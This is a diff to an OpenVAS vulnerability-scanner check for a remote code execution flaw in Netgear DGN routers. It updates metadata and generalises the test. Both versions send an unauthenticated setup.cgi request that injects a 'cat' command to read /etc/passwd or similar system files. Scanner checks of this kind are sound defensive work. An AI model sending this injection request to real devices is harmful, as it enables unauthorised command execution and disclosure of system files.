@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_netgear_dgn_remote_code_ex_06_13.nasl 10771 2018-08-04 15:18:29Z cfischer $
+# $Id: gb_netgear_dgn_remote_code_ex_06_13.nasl 11960 2018-10-18 10:48:11Z jschulte $
 #
 # Netgear DGN Remote Code Execution Vulnerability
 #
@@ -28,17 +28,18 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103728");
-  script_version("$Revision: 10771 $");
+  script_version("$Revision: 11960 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
   script_name("Netgear DGN Remote Code Execution Vulnerability");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-04 17:18:29 +0200 (Sat, 04 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-18 12:48:11 +0200 (Thu, 18 Oct 2018) $");
   script_tag(name:"creation_date", value:"2013-06-04 11:47:22 +0200 (Tue, 04 Jun 2013)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
-  script_dependencies("gb_get_http_banner.nasl");
+  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
+  script_require_keys("Host/runs_unixoide");
   script_mandatory_keys("NETGEAR_DGN/banner");
 
   script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121860/Netgear-DGN-Authentication-Bypass-Command-Execution.html");
@@ -66,16 +67,24 @@ if(description)
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
 banner = get_http_banner(port:port);
 if(!banner || 'Basic realm="NETGEAR DGN' >!< banner)exit(0);
 
-url = '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/etc/passwd&curpath=/&currentsetting.htm=1';
-if(http_vuln_check(port:port, url:url, pattern:"root:x:0:[01]:.*")) {
-  report = report_vuln_url(port:port, url:url);
-  security_message(port:port, data:report);
-  exit(0);
+files = traversal_files("linux");
+
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  url = '/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/' + file + '&curpath=/&currentsetting.htm=1';
+  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
+    report = report_vuln_url(port:port, url:url);
+    security_message(port:port, data:report);
+    exit(0);
+  }
 }
 
 exit(99);
